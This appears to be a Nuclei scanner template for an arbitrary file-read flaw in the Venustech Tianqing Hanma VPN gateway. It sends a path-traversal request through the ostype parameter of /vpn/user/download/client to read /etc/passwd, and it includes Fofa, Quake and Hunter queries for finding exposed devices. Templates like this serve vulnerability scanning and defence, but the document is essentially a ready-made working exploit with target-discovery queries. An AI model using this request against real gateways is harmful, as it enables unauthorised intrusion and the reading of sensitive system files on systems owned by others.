id: Venustech_TQHM_VPN-download-client_Fileread

info:
  tags: Venustech_TQHM_VPN-download-client_Fileread
  name: Venustech_TQHM_VPN-download-client_Fileread
  author: xinghe
  severity: high
  description: 启明星辰天清汉马VPN安全网关/vpn/user/download/client接口ostype参数存在任意文件读取漏洞
  metadata:
    Fofa-query: app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input")||app="启明星辰-天清汉马VPN"
    Quake: body="select_auth_method" OR body="select_auth_input"
    Hunter: body="select_auth_method" OR body="select_auth_input"
    
http:
- raw:
  - |+
    GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1
    Host: {{Hostname}}
    User-Agent: User-AgentMozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0


  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'contains(body_1, "root")'
      condition: and